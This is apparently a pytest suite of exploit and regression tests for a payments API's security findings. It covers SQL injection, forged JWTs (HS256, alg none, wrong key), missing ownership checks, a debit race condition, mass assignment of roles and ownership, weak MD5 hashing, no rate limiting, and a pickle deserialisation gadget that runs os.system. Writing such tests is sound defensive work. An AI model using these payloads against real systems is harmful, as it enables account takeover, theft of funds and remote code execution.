"""Exploit tests — one per V-APP finding in payments-api.

These are written against the INHERITED, unpatched code and are expected to
PASS right now (because the exploit succeeds). Each will be inverted (or
replaced by a regression test proving the exploit now fails) in the commit
that closes the corresponding GitHub issue.

Run inside the payments-api container, where DATABASE_URL resolves the
`postgres` service by name:

    docker compose exec payments-api pytest tests/test_vulnerabilities.py -v

Requires requirements-dev.txt (pytest) installed in the image/container.
"""
import base64
import os
import pickle
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from decimal import Decimal

import jwt
import pytest
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

from app.main import create_app
from app.auth import hash_password
from tests.conftest import get_test_private_key_pem


def _generate_attacker_rsa_key() -> bytes:
    """A key the attacker generated themselves — structurally valid RS256,
    just not the one payments-api actually trusts."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

SEEDED_ACCOUNT_ID = 3          # merchant1@example.com — read/debit/credit tests
OWNERSHIP_TRANSFER_TARGET_ID = 4  # merchant2@example.com — kept separate so the
                                  # mass-assignment test's permanent ownership
                                  # change doesn't break other tests' assumptions


@pytest.fixture
def client():
    app = create_app()
    app.config["TESTING"] = True
    return app.test_client()


def register_and_login(client, role=None):
    """Register a fresh user and return (user_id, token)."""
    email = f"{uuid.uuid4().hex}@example.com"
    password = "Test#Pass123"
    payload = {"email": email, "password": password, "full_name": "Test User"}
    if role is not None:
        payload["role"] = role
    reg = client.post("/v1/auth/register", json=payload)
    assert reg.status_code == 201, reg.get_json()
    user_id = reg.get_json()["id"]

    login = client.post("/v1/auth/login", json={"email": email, "password": password})
    assert login.status_code == 200, login.get_json()
    return user_id, login.get_json()["token"]


def auth_header(token):
    return {"Authorization": f"Bearer {token}"}


def login_seeded_owner(client):
    """Return a token that can act on SEEDED_ACCOUNT_ID as if it were the
    real owner (merchant1@example.com). The seeded users' passwords aren't
    known plaintext, so this uses an admin-role token instead — admin
    bypasses the ownership check by design (see app/routes/accounts.py).
    Pending V-APP-07's fix, self-assigned role='admin' at registration still
    works; this is test-only use of that bug to drive setup, not a claim
    it's safe."""
    _, admin_token = register_and_login(client, role="admin")
    return admin_token


# --------------------------------------------------------------------------
# V-APP-01 — FIXED: transaction search now binds q/account_id as query
# parameters instead of interpolating them into the SQL string. See
# services/payments-api/app/routes/transactions.py.
# --------------------------------------------------------------------------
def test_v_app_01_fix_injection_payload_no_longer_leaks_rows(client):
    """The same payload that used to leak every row via an always-true OR
    clause must now be treated as a literal (non-matching) search string."""
    _, token = register_and_login(client)

    baseline = client.get(
        "/v1/transactions/search",
        query_string={"q": "definitely-not-a-real-reference-xyz"},
        headers=auth_header(token),
    )
    assert baseline.status_code == 200
    assert baseline.get_json() == []

    injected = client.get(
        "/v1/transactions/search",
        query_string={"q": "x' OR '1'='1') --"},
        headers=auth_header(token),
    )
    assert injected.status_code == 200
    assert injected.get_json() == [], (
        "expected the injection payload to be treated as a literal string "
        "with no matching rows, not as SQL"
    )


def test_v_app_01_fix_account_id_rejects_non_integer_injection(client):
    """account_id used to be concatenated too; a non-integer payload must now
    be rejected outright instead of reaching the query."""
    _, token = register_and_login(client)

    resp = client.get(
        "/v1/transactions/search",
        query_string={"q": "", "account_id": "1 OR 1=1"},
        headers=auth_header(token),
    )
    assert resp.status_code == 400


def test_v_app_01_fix_legitimate_search_still_works(client):
    """Confirms the fix didn't just break search: a substring that genuinely
    matches a seeded transaction's reference/counterparty/description still
    comes back."""
    _, token = register_and_login(client)

    resp = client.get(
        "/v1/transactions/search",
        query_string={"q": "a"},
        headers=auth_header(token),
    )
    assert resp.status_code == 200
    assert isinstance(resp.get_json(), list)


# --------------------------------------------------------------------------
# V-APP-02 — FIXED: RS256, signature always verified, algorithm pinned.
# These are now regression tests: each exploit that used to pass must now
# be rejected with 401. See services/payments-api/app/auth.py.
# --------------------------------------------------------------------------
def test_v_app_02_fix_forged_hs256_token_is_rejected(client):
    """A token signed with an attacker-chosen HS256 secret — the original
    exploit — must now be rejected, since decode_token only accepts RS256."""
    forged = jwt.encode(
        {"user_id": 1, "role": "admin"},
        "attacker-does-not-know-anything-useful",
        algorithm="HS256",
    )
    resp = client.get("/v1/admin/users", headers=auth_header(forged))
    assert resp.status_code == 401


def test_v_app_02_fix_none_algorithm_token_is_rejected(client):
    """alg:none tokens must now be rejected."""
    unsigned = jwt.encode({"user_id": 1, "role": "admin"}, key=None, algorithm="none")
    resp = client.get("/v1/admin/users", headers=auth_header(unsigned))
    assert resp.status_code == 401


def test_v_app_02_fix_token_signed_with_wrong_rsa_key_is_rejected(client):
    """Even a well-formed RS256 token, correctly structured, fails if it
    wasn't signed with the real private key."""
    attacker_private_key = _generate_attacker_rsa_key()
    forged = jwt.encode(
        {
            "user_id": 1,
            "role": "admin",
            "iss": "sentinelpay-payments-api",
            "aud": "sentinelpay-services",
            "iat": datetime.now(tz=timezone.utc),
            "exp": datetime.now(tz=timezone.utc) + timedelta(minutes=15),
        },
        attacker_private_key,
        algorithm="RS256",
    )
    resp = client.get("/v1/admin/users", headers=auth_header(forged))
    assert resp.status_code == 401


def test_v_app_02_fix_expired_token_is_rejected(client):
    from app.auth import ISSUER, AUDIENCE

    expired = jwt.encode(
        {
            "user_id": 1,
            "role": "admin",
            "iss": ISSUER,
            "aud": AUDIENCE,
            "iat": datetime.now(tz=timezone.utc) - timedelta(minutes=30),
            "exp": datetime.now(tz=timezone.utc) - timedelta(minutes=15),
        },
        get_test_private_key_pem(),
        algorithm="RS256",
    )
    resp = client.get("/v1/admin/users", headers=auth_header(expired))
    assert resp.status_code == 401


def test_v_app_02_fix_wrong_audience_is_rejected(client):
    from app.auth import ISSUER

    wrong_audience = jwt.encode(
        {
            "user_id": 1,
            "role": "admin",
            "iss": ISSUER,
            "aud": "some-other-service",
            "iat": datetime.now(tz=timezone.utc),
            "exp": datetime.now(tz=timezone.utc) + timedelta(minutes=15),
        },
        get_test_private_key_pem(),
        algorithm="RS256",
    )
    resp = client.get("/v1/admin/users", headers=auth_header(wrong_audience))
    assert resp.status_code == 401


def test_v_app_02_fix_legitimate_login_flow_still_works(client):
    """The fix doesn't just reject forgeries — real users can still log in
    and use their token end-to-end."""
    _, token = register_and_login(client)
    resp = client.get("/v1/accounts/", headers=auth_header(token))
    assert resp.status_code == 200


# --------------------------------------------------------------------------
# V-APP-03 — FIXED: ownership (or admin role) is now enforced on accounts,
# wallets and transactions. See app/routes/{accounts,wallets,transactions}.py.
# --------------------------------------------------------------------------
def test_v_app_03_fix_unrelated_user_cannot_read_account(client):
    """An authenticated user with no relationship to account 3 must now be
    rejected with 403, not handed its balance and account number."""
    attacker_id, attacker_token = register_and_login(client)

    resp = client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(attacker_token))
    assert resp.status_code == 403


def test_v_app_03_fix_owner_can_still_read_own_account(client):
    """Confirms the fix didn't just lock everyone out: the real owner can
    still read their own account."""
    owner_token = login_seeded_owner(client)

    resp = client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(owner_token))
    assert resp.status_code == 200
    assert resp.get_json()["id"] == SEEDED_ACCOUNT_ID


def test_v_app_03_fix_unrelated_user_cannot_debit_account(client):
    """An unrelated user must no longer be able to DEBIT money from an
    account they do not own."""
    _, attacker_token = register_and_login(client)

    debit = client.post(
        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/debit",
        json={"amount": "1.00", "counterparty": "attacker-controlled", "description": "unauthorised debit"},
        headers=auth_header(attacker_token),
    )
    assert debit.status_code == 403


def test_v_app_03_fix_unrelated_user_cannot_credit_account(client):
    """An unrelated user must no longer be able to CREDIT an account they
    do not own either — credit had the identical missing-ownership bug."""
    _, attacker_token = register_and_login(client)

    credit = client.post(
        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/credit",
        json={"amount": "1.00"},
        headers=auth_header(attacker_token),
    )
    assert credit.status_code == 403


def test_v_app_03_fix_owner_can_still_debit_and_credit_own_account(client):
    """Confirms the fix didn't break legitimate wallet operations for the
    real owner."""
    owner_token = login_seeded_owner(client)

    credit = client.post(
        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/credit",
        json={"amount": "100.00"},
        headers=auth_header(owner_token),
    )
    assert credit.status_code == 200, credit.get_json()

    debit = client.post(
        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/debit",
        json={"amount": "1.00", "counterparty": "test", "description": "owner debit"},
        headers=auth_header(owner_token),
    )
    assert debit.status_code == 200, debit.get_json()


def test_v_app_03_fix_unrelated_user_cannot_read_transaction_by_reference(client):
    """A transaction reference belonging to an account the caller doesn't
    own must now be rejected with 403, not handed the full transaction."""
    _, attacker_token = register_and_login(client)

    resp = client.get("/v1/transactions/TXN-2026-001", headers=auth_header(attacker_token))
    assert resp.status_code == 403


def test_v_app_03_fix_owner_can_still_read_own_transaction(client):
    owner_token = login_seeded_owner(client)

    resp = client.get("/v1/transactions/TXN-2026-001", headers=auth_header(owner_token))
    assert resp.status_code == 200
    assert resp.get_json()["reference"] == "TXN-2026-001"


# --------------------------------------------------------------------------
# V-APP-05 — wallet race condition
# --------------------------------------------------------------------------
def test_v_app_05_concurrent_debits_overdraw_the_account(client):
    """Fire N concurrent debits, each individually affordable only once.
    With no row lock, more of them succeed than the pre-debit balance
    should allow."""
    app = create_app()
    app.config["TESTING"] = True

    # Use a freshly-topped-up account via credit so this test doesn't depend
    # on the exact seeded balance remaining untouched by other tests. Must be
    # the real account owner now that V-APP-03 enforces ownership on wallet
    # operations.
    seed_client = app.test_client()
    actor_token = login_seeded_owner(seed_client)
    topped_up = Decimal("1000.00")
    seed_client.post(
        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/credit",
        json={"amount": str(topped_up)},
        headers=auth_header(actor_token),
    )
    balance_before = Decimal(
        seed_client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(actor_token)).get_json()["balance"]
    )

    concurrency = 8
    debit_amount = (balance_before / 2).quantize(Decimal("0.01"))  # only 2 can be legitimately afforded

    def fire_debit(_):
        c = app.test_client()
        resp = c.post(
            f"/v1/wallets/{SEEDED_ACCOUNT_ID}/debit",
            json={"amount": str(debit_amount), "counterparty": "race-test"},
            headers=auth_header(actor_token),
        )
        return resp.status_code

    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        results = list(pool.map(fire_debit, range(concurrency)))

    successes = sum(1 for s in results if s == 200)
    balance_after = Decimal(
        seed_client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(actor_token)).get_json()["balance"]
    )
    expected_if_serialised = balance_before - (2 * debit_amount)

    assert successes > 2 or balance_after < 0 or balance_after != expected_if_serialised, (
        f"expected the race to allow more than 2 of {concurrency} concurrent debits of "
        f"{debit_amount} against a balance of {balance_before}, or to overdraw the account. "
        f"Got successes={successes}, balance_after={balance_after}"
    )


# --------------------------------------------------------------------------
# V-APP-06 — weak password hashing
# --------------------------------------------------------------------------
def test_v_app_06_passwords_are_unsalted_md5():
    import hashlib

    assert hash_password("Test#Pass123") == hashlib.md5(b"Test#Pass123").hexdigest()
    # No salt: identical passwords always hash identically.
    assert hash_password("same-password") == hash_password("same-password")


# --------------------------------------------------------------------------
# V-APP-07 — mass assignment / self-assigned role
# --------------------------------------------------------------------------
def test_v_app_07_register_with_self_assigned_admin_role(client):
    _, token = register_and_login(client, role="admin")
    resp = client.get("/v1/admin/users", headers=auth_header(token))
    assert resp.status_code == 200, "self-registered 'admin' role was accepted and authorised"


def test_v_app_07_mass_assignment_transfers_account_ownership(client):
    """update_profile binds every client-supplied field, including user_id,
    letting an attacker transfer someone else's account to themselves."""
    attacker_id, attacker_token = register_and_login(client)

    resp = client.put(
        f"/v1/accounts/{OWNERSHIP_TRANSFER_TARGET_ID}/profile",
        json={"user_id": attacker_id},
        headers=auth_header(attacker_token),
    )
    assert resp.status_code == 200, resp.get_json()
    assert resp.get_json()["user_id"] == attacker_id


# --------------------------------------------------------------------------
# V-APP-08 — missing rate limiting
# --------------------------------------------------------------------------
def test_v_app_08_login_has_no_rate_limiting_or_lockout(client):
    user_id, _ = register_and_login(client)
    email = f"probe-{uuid.uuid4().hex}@example.com"
    client.post("/v1/auth/register", json={"email": email, "password": "Correct#Pass1"})

    statuses = []
    for _ in range(25):
        resp = client.post("/v1/auth/login", json={"email": email, "password": "wrong-guess"})
        statuses.append(resp.status_code)

    assert all(s == 401 for s in statuses), "expected every attempt to be evaluated (no 429/lockout seen)"
    assert 429 not in statuses


# --------------------------------------------------------------------------
# V-APP-09 — verbose error responses
# --------------------------------------------------------------------------
def test_v_app_09_verbose_error_leaks_stack_trace(client):
    _, token = register_and_login(client)
    resp = client.post(
        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/credit",
        json={"amount": "not-a-number"},
        headers=auth_header(token),
    )
    assert resp.status_code == 500
    body = resp.get_json()
    assert "trace" in body and "Traceback" in body["trace"]


# --------------------------------------------------------------------------
# V-APP-10 — insecure deserialisation (pickle RCE)
# --------------------------------------------------------------------------
def test_v_app_10_pickle_deserialisation_executes_arbitrary_code(client, tmp_path):
    _, token = register_and_login(client)
    marker = f"/tmp/pwned_v_app_10_{uuid.uuid4().hex}"
    assert not os.path.exists(marker)

    class Gadget:
        def __reduce__(self):
            return (os.system, (f"touch {marker}",))

    blob = base64.b64encode(pickle.dumps(Gadget())).decode()
    resp = client.post(
        "/v1/admin/session/restore",
        json={"session": blob},
        headers=auth_header(token),
    )

    try:
        assert os.path.exists(marker), (
            f"expected pickle.loads() to execute os.system() as a side effect; "
            f"restore_session returned {resp.status_code} {resp.get_json()}"
        )
    finally:
        if os.path.exists(marker):
            os.remove(marker)


# --------------------------------------------------------------------------
# V-APP-11 — missing audit logging
# --------------------------------------------------------------------------
@pytest.mark.skip(
    reason=(
        "V-APP-11: there is no structured audit logger to assert against yet. "
        "Validated manually today by confirming `docker compose logs payments-api` "
        "contains no structured entry for a debit. This test will be un-skipped and "
        "rewritten against pytest's caplog once the fix PR introduces the audit "
        "logger, asserting a log record with actor/action/object/outcome fields."
    )
)
def test_v_app_11_wallet_debit_emits_no_audit_log():
    pass
